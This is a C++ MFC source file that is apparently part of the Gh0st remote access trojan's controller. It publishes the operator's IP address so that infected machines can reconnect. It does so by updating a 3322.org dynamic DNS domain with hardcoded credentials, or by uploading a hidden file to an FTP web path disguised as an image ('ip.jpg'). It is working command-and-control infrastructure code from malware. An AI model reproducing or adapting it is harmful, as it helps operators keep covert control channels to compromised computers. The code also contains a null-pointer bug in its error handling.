// UPDATEIP.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "UPDATEIP.h"
#include "PcView.h"

//#include "winsock.h"//---
#include "afxinet.h" //WinInet所需要的头文件
#include <Shlwapi.h>

//#include "include/StatLink.h"
//#include "include/IniFile.h"
//#include "Shlwapi.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CUPDATEIP

IMPLEMENT_DYNCREATE(CUPDATEIP, CFormView)

CUPDATEIP::CUPDATEIP()
	: CFormView(CUPDATEIP::IDD)
{
	//{{AFX_DATA_INIT(CUPDATEIP)
	m_FtpUrl =  ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "FtpUrl", "\\wwwroot\\ip.jpg");
	m_FtpUser = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "FtpUser", "123");
	m_FtpPort = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Connection", "FtpPort", 21);
	m_FtpPass = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "FtpPass", "123");
	m_FtpIP = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "FtpIP", "127.0.0.1");
    m_DnsUser = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "DnsUser", "hjshell");
	m_DnsPass = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "DnsPass", "hjshell");
	m_DnsDomain = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "DnsDomain", "hjshell.3322.org");
	m_zifushuan = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Connection", "zifushuan", "AAAAXl1YcV9xX3FeZWdYZ1iPAAAA");
	//}}AFX_DATA_INIT
}

CUPDATEIP::~CUPDATEIP()
{
}

void CUPDATEIP::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CUPDATEIP)
	DDX_Control(pDX, IDC_COMBO_DNSIP, m_Combo_DnsIP);
	DDX_Text(pDX, IDC_FTPURL, m_FtpUrl);
	DDV_MaxChars(pDX, m_FtpUrl, 200);
	DDX_Text(pDX, IDC_EDIT_FTPUSER, m_FtpUser);
	DDV_MaxChars(pDX, m_FtpUser, 100);
	DDX_Text(pDX, IDC_EDIT_FTPPORT, m_FtpPort);
	DDV_MinMaxUInt(pDX, m_FtpPort, 0, 65500);
	DDX_Text(pDX, IDC_EDIT_FTPPASS, m_FtpPass);
	DDV_MaxChars(pDX, m_FtpPass, 100);
	DDX_Text(pDX, IDC_EDIT_FTPIP, m_FtpIP);
	DDV_MaxChars(pDX, m_FtpIP, 100);
	DDX_Text(pDX, IDC_EDIT_DNSUSER, m_DnsUser);
	DDV_MaxChars(pDX, m_DnsUser, 100);
	DDX_Text(pDX, IDC_EDIT_DNSPASS, m_DnsPass);
	DDV_MaxChars(pDX, m_DnsPass, 100);
	DDX_Text(pDX, IDC_EDIT_DNSDOMAIN, m_DnsDomain);
	DDV_MaxChars(pDX, m_DnsDomain, 100);
	DDX_Text(pDX, IDC_COMBO_FTPIP, m_zifushuan);
	DDV_MaxChars(pDX, m_zifushuan, 200);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CUPDATEIP, CFormView)
	//{{AFX_MSG_MAP(CUPDATEIP)
	ON_BN_CLICKED(IDC_BTN_DNSUPDATE, OnBtnDnsupdate)
	ON_BN_CLICKED(IDC_BTN_FTPUPDATE, OnBtnFtpupdate)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CUPDATEIP diagnostics

#ifdef _DEBUG
void CUPDATEIP::AssertValid() const
{
	CFormView::AssertValid();
}

void CUPDATEIP::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CUPDATEIP message handlers

void CUPDATEIP::OnInitialUpdate() 
{
	//CFormView::OnInitialUpdate();
	//SetIcon(AfxGetApp()->LoadIcon(IDI_ICOIP), FALSE);
	CenterWindow();		
	
	//获得IP--------------------------------
	WSADATA wsaData;
	WSAStartup(MAKEWORD(1,1),&wsaData);
	char szhostname[128];
    
	if( gethostname(szhostname, 128) == 0 )
	{
		
		struct hostent * phost;
		int i,j,h_length=4;
		phost = gethostbyname(szhostname);
		for( i = 0; phost!= NULL && phost->h_addr_list[i]!= NULL; i++) 
		{
			CString str;
			for( j = 0; j<h_length; j++ ) 
			{
				CString addr;			
				if( j > 0 )
					str += ".";			
				addr.Format("%u", (unsigned int)((unsigned char*)phost->h_addr_list[i])[j]);
				str += addr;
			}
			m_Combo_DnsIP.AddString(str);
			//			m_Combo_FtpIP.AddString(str);	
		}
		m_Combo_DnsIP.SetCurSel(0);
		//		m_Combo_FtpIP.SetCurSel(0);
	}
	UpdateData(FALSE);	
//	return TRUE; 
}

void DELETEaa()
{
	//Sleep(5000);
	char Path[MAX_PATH];
    GetModuleFileName(NULL, Path, sizeof(Path));   //
    PathRemoveFileSpec(Path);
	strcat(Path,"\\Ftp.ini");
	//MessageBox(Path,"删除");
	DeleteFile(Path);
}

void CUPDATEIP::OnBtnFtpupdate() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "FtpUrl", m_FtpUrl);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "FtpUser", m_FtpUser);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Connection", "FtpPort", m_FtpPort);
	//((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "FtpPass", m_FtpPass);//不保存密码
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "FtpIP", m_FtpIP);

	//打包本地IP及端口信息为文件------------------
	CString ip,str;
	GetDlgItem(IDC_COMBO_FTPIP)->GetWindowText(ip);
	HANDLE hFile;

    hFile = CreateFile("Ftp.ini", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, NULL);
    DWORD numWrite;
    WriteFile (hFile,ip,ip.GetLength(), &numWrite, NULL);	
	CloseHandle(hFile);
	CreateThread(NULL,
		0,
		(LPTHREAD_START_ROUTINE)FtpUpdateThread,
		this,
		0,
		NULL);
}

void CUPDATEIP::OnBtnDnsupdate() 
{
	// TODO: Add your control notification handler code here
	UpdateData();

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "DnsUser", m_DnsUser);	
	//((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "DnsPass", m_DnsPass);//不保存密码
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "DnsDomain", m_DnsDomain);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Connection", "zifushuan", m_zifushuan);

	CString strUrl,strTemp;
	GetDlgItem(IDC_COMBO_DNSIP)->GetWindowText(strTemp);
	strUrl = "http://";
	strUrl += m_DnsUser;
	strUrl +=":";
	strUrl +=m_DnsPass;
	strUrl +="@members.3322.org/dyndns/update?system=dyndns&hostname=";
	strUrl +=m_DnsDomain;
	strUrl +="&myip=";
	strUrl +=strTemp;
	strUrl +="&wildcard=OFF";

	CInternetSession m_Session(NULL,0);
	CHttpFile* pHttpFile=NULL;
	pHttpFile=(CHttpFile*) m_Session.OpenURL(strUrl);
	if(pHttpFile == NULL)
	{
		MessageBox("Update Error!","3322 Domain");
		pHttpFile->Close();
		m_Session.Close();
		return;
	}
	pHttpFile->ReadString(strTemp);

	pHttpFile->Close();
	m_Session.Close();

	MessageBox(strTemp,"3322域名");	
}

DWORD CUPDATEIP::FtpUpdate()
{
	//FTP上传文件---------------------------------
	CInternetSession *seu;
	CFtpConnection *pFTP;
	   //新建对话
	seu=new CInternetSession(AfxGetAppName(),1,PRE_CONFIG_INTERNET_ACCESS);
	try 
	{ 
		//新建连接对象
		pFTP=seu->GetFtpConnection(m_FtpIP,m_FtpUser,m_FtpPass,m_FtpPort,FALSE); 
	} 
	catch(CInternetException *pEx) 
	{
		//获取错误
		TCHAR szError[1024];
		if(pEx->GetErrorMessage(szError,1024))
			MessageBox(szError,"FTP更新");
		else  
			MessageBox("There was an exception","FTP更新");
		pEx->Delete();
		pFTP=NULL;
		DELETEaa();
		return 0;
	}
       //上传
	if(pFTP->PutFile("Ftp.ini",m_FtpUrl))
		MessageBox("更新IP成功!","FTP更新");
	else
		MessageBox("更新IP失败","FTP更新");
	DELETEaa();
    pFTP->Close();
	return 0;
}

DWORD CUPDATEIP::FtpUpdateThread(void* pThis)
{
	return ((CUPDATEIP*)pThis)->FtpUpdate();
}

